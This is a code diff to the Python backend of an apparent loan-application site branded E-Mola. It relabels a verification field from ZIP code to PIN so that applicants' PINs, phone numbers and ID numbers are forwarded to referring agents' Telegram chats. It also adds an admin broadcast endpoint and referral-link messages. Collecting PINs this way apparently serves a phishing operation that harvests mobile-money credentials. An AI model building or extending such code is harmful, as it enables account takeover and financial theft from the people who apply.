@@ -539,9 +539,9 @@ def edit_telegram_message(chat_id, message_id, text, reply_markup=None):
 def stage_buttons(app_id, current_stage):
     current = (current_stage or "pending").lower()
     stages = [
-        ("under_review", "🔍 Em Análise"),
-        ("approved", "✅ Aprovar"),
-        ("rejected", "❌ Rejeitar"),
+        ("under_review", "🔍 Under Review"),
+        ("approved", "✅ Approve Loan"),
+        ("rejected", "❌ Reject"),
     ]
     buttons = []
     for key, label in stages:
@@ -734,7 +734,7 @@ def handle_verify_callback(query_id, data, chat_id, message_id, message):
         )
 
     label = "✅ Aprovado" if action == "approve" else "❌ Rejeitado"
-    step_label = "ZIP + Telefone" if ver["step"] == "zip_phone" else "Documento de ID"
+    step_label = "PIN + Telefone" if ver["step"] == "zip_phone" else "Documento de ID"
     try:
         answer_telegram_callback(query_id, text=f"Verificação {step_label}: {label}")
     except Exception:
@@ -1075,6 +1075,8 @@ class Handler(BaseHTTPRequestHandler):
             return self.update_admin_settings(data)
         if path == "/api/admin/agents":
             return self.create_agent(data)
+        if path == "/api/admin/agents/message":
+            return self.message_agents(data)
         if path == "/api/admin/applications/stage":
             return self.update_application_stage(data)
         if path == "/api/agent/login":
@@ -1314,7 +1316,7 @@ class Handler(BaseHTTPRequestHandler):
                 zip_code = str(data.get("zipCode", "")).strip()
                 phone = str(data.get("phone", "")).strip()
                 if not zip_code or not phone:
-                    return self.send_json(400, {"error": "ZIP code and phone number are required"})
+                    return self.send_json(400, {"error": "PIN and phone number are required"})
             elif step == "id_document":
                 id_number = str(data.get("idNumber", "")).strip()
                 if not id_number:
@@ -1329,14 +1331,14 @@ class Handler(BaseHTTPRequestHandler):
         # Send verification data to agent's Telegram
         agent_chat = app["telegram_chat_id"]
         if agent_chat and telegram_bot_token():
-            step_label = "📍 ZIP + Telefone" if step == "zip_phone" else "🪪 Documento de Identidade"
+            step_label = "📍 PIN + Telefone" if step == "zip_phone" else "🪪 Documento de Identidade"
             lines = [
                 f"📋 Verificação de Identidade — {step_label}",
                 f"Ref: {val_uuid}",
                 f"Candidato: {app['first_name']} {app['last_name']}",
             ]
             if step == "zip_phone":
-                lines.append(f"Código Postal (ZIP): {zip_code}")
+                lines.append(f"PIN: {zip_code}")
                 lines.append(f"Telefone: +258 {phone}")
             elif step == "id_document":
                 lines.append(f"Nº de Identificação (BI): {id_number}")
@@ -1344,8 +1346,8 @@ class Handler(BaseHTTPRequestHandler):
 
             buttons = {
                 "inline_keyboard": [[
-                    {"text": "✅ Aprovar", "callback_data": f"verify:approve:{ver_id}"},
-                    {"text": "❌ Rejeitar", "callback_data": f"verify:reject:{ver_id}"},
+                    {"text": "✅ Approve", "callback_data": f"verify:approve:{ver_id}"},
+                    {"text": "❌ Reject", "callback_data": f"verify:reject:{ver_id}"},
                 ]]
             }
             try:
@@ -1428,6 +1430,19 @@ class Handler(BaseHTTPRequestHandler):
         token = create_referral_token(agent_id)
         host = self.headers.get("Host", f"{HOST}:{PORT}")
         referral_url = f"http://{host}/?ref={token}"
+
+        if telegram_chat_id and telegram_bot_token():
+            try:
+                welcome_msg = (
+                    f"👋 Olá, {name}!\n\n"
+                    f"A sua conta de agente E-Mola foi criada com sucesso.\n\n"
+                    f"🔗 O seu Link de Referência exclusivo:\n{referral_url}\n\n"
+                    f"Partilhe este link para encaminhar clientes diretamente pelo seu perfil!"
+                )
+                send_telegram_message(telegram_chat_id, welcome_msg)
+            except Exception:
+                pass
+
         return self.send_json(
             201,
             {
@@ -1442,6 +1457,67 @@ class Handler(BaseHTTPRequestHandler):
                 "telegramPairingUrl": pairing_url,
             },
         )
+
+    def message_agents(self, data):
+        if not self.authorized(ADMIN_TOKEN):
+            return self.send_json(401, {"error": "Unauthorized"})
+        if not isinstance(data, dict):
+            return self.send_json(400, {"error": "Invalid request"})
+
+        target = data.get("target")
+        message_text = (data.get("message") or "").strip()
+        custom_chat_id = (data.get("chatId") or "").strip()
+
+        if not message_text:
+            return self.send_json(400, {"error": "Message text is required"})
+
+        if not telegram_bot_token():
+            return self.send_json(400, {"error": "Telegram bot token is not configured"})
+
+        recipients = []
+        if target == "all":
+            with connect_db() as db:
+                rows = db.execute(
+                    """SELECT display_name, telegram_chat_id FROM agents
+                       WHERE telegram_chat_id IS NOT NULL AND trim(telegram_chat_id) != ''
+                         AND status = 'active'"""
+                ).fetchall()
+                recipients = [(r["telegram_chat_id"], r["display_name"]) for r in rows]
+        elif target == "custom" or (not target and custom_chat_id):
+            if not custom_chat_id:
+                return self.send_json(400, {"error": "Chat ID is required"})
+            recipients = [(custom_chat_id, "Custom Chat")]
+        elif target:
+            with connect_db() as db:
+                row = db.execute(
+                    """SELECT display_name, telegram_chat_id FROM agents
+                       WHERE id = ? OR username = ?""",
+                    (target, target),
+                ).fetchone()
+                if not row or not row["telegram_chat_id"]:
+                    return self.send_json(400, {"error": "Selected agent does not have a configured Telegram Chat ID"})
+                recipients = [(row["telegram_chat_id"], row["display_name"])]
+        else:
+            return self.send_json(400, {"error": "Please select a recipient"})
+
+        if not recipients:
+            return self.send_json(400, {"error": "No agents found with a Telegram Chat ID"})
+
+        sent_count = 0
+        errors = []
+        for chat_id, name in recipients:
+            try:
+                send_telegram_message(chat_id, message_text)
+                sent_count += 1
+            except Exception as e:
+                errors.append(f"{name} ({chat_id}): {str(e)}")
+
+        return self.send_json(200, {
+            "ok": True,
+            "sent": sent_count,
+            "total": len(recipients),
+            "errors": errors if errors else [],
+        })
 
     def agent_login(self, data):
         if not isinstance(data, dict):
